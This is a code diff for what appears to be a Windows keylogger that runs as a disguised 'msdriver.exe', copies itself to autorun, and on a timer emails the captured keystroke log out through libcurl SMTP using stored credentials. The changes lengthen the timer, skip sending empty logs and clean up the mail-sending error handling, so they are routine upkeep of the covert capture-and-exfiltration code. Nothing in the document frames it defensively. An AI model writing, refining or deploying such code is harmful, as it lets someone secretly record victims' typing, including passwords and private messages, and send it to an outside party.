@@ -22,7 +22,7 @@ tstring executableFileName(_T("msdriver.exe"));
 tstring logFileName(_T("bin"));
 tstring dirPath(_T("c:\\driver"));
 bool	copyToAutorun = true;
-int		timerPeriodSeconds = 3;
+int		timerPeriodSeconds = 10;
 
 //Mail settings
 string login = "sender@example.com";
@@ -136,6 +136,8 @@ VOID CALLBACK TimerCallback(HWND, UINT, UINT idTimer, DWORD dwTime)
 
 void processLog()
 {
+	if (keyLog.empty())
+		return;
 	if (mode == sendLogEmail)
 	{
 		if (!sendMail())
@@ -174,10 +176,7 @@ static size_t readfunc(void* ptr, size_t size, size_t nmemb, void* userp)
 
 bool sendMail()
 {
-	CURL* curl = curl_easy_init();
-	CURLcode res = CURLE_OK;
-
-	if (curl) {
+	if (CURL* curl = curl_easy_init()) {
 		curl_easy_setopt(curl, CURLOPT_USERNAME, login.c_str());
 		curl_easy_setopt(curl, CURLOPT_PASSWORD, password.c_str());
 		curl_easy_setopt(curl, CURLOPT_URL, URL.c_str());
@@ -190,16 +189,12 @@ bool sendMail()
 		curl_easy_setopt(curl, CURLOPT_READFUNCTION, readfunc);
 		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
 
-		res = curl_easy_perform(curl);
+		CURLcode res = curl_easy_perform(curl);
 
 		curl_slist_free_all(recipients);
-
-		if (res != CURLE_OK)
-			return false;
-
 		curl_easy_cleanup(curl);
 
-		return true;
+		return res == CURLE_OK;
 	}
 	else return false;
 }
